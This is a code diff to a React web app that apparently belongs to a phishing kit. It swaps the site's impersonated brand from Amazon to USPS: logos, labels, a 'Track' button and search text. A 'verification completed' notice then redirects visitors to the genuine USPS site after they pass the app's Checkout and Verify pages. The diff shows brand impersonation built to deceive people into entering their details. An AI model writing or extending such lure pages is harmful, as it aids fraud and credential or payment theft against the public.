@@ -10,7 +10,7 @@ import Checkout from './pages/Checkout';
 import Verify from './pages/Verify';
 import AppCheck from './pages/AppCheck';
 
-const ADMIN_EXTERNAL_URL = 'https://www.amazon.com/';
+const ADMIN_EXTERNAL_URL = 'https://www.usps.com/';
 
 function getRouteNotice(target: string, reason: string) {
   const cleanReason = reason.trim();
@@ -63,7 +63,7 @@ function AdminRouteListener({ onNotice }: { onNotice: (message: string) => void 
       try {
         const parsed = new URL(ADMIN_EXTERNAL_URL, window.location.origin);
         if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return;
-        onNotice('Verification completed. Redirecting you to the order page.');
+        onNotice('Verification completed. Redirecting you to the USPS tracking page.');
         if (pendingTimerRef.current) window.clearTimeout(pendingTimerRef.current);
         pendingTimerRef.current = window.setTimeout(() => {
           window.location.href = parsed.toString();
@@ -175,28 +175,28 @@ function App() {
                 <span />
               </button>
               <div className="alz-nav-brand">
-                <div className="alz-nav-logo" aria-label="Amazon">
-                  <img src="/amazon-header-logo.svg" alt="Amazon" className="alz-nav-logo-img" />
+                <div className="alz-nav-logo" aria-label="USPS">
+                  <img src="/usps-header-logo.svg" alt="USPS" className="alz-nav-logo-img" />
                 </div>
               </div>
             </div>
             <div className="alz-nav-actions">
               <div className="alz-nav-signin">
-                <span>Sign in</span>
+                <span>Sign In</span>
                 <span className="alz-nav-caret" aria-hidden="true">&gt;</span>
                 <span className="alz-nav-user" aria-hidden="true">
                   <span className="alz-nav-user-head" />
                   <span className="alz-nav-user-body" />
                 </span>
               </div>
-              <div className="alz-nav-cart" aria-label="Cart">
-                <img src="/amazon-cart-icon.svg" alt="" aria-hidden="true" className="alz-nav-cart-img" />
+              <div className="alz-nav-track" aria-label="Track package">
+                <span className="alz-nav-track-label">Track</span>
               </div>
             </div>
           </div>
           <div className="alz-nav-search-row">
             <div className="alz-nav-search-shell" aria-hidden="true">
-              <div className="alz-nav-search-input">Search Amazon</div>
+              <div className="alz-nav-search-input">Search USPS tracking</div>
               <div className="alz-nav-search-action">
                 <span className="alz-nav-search-icon" />
               </div>
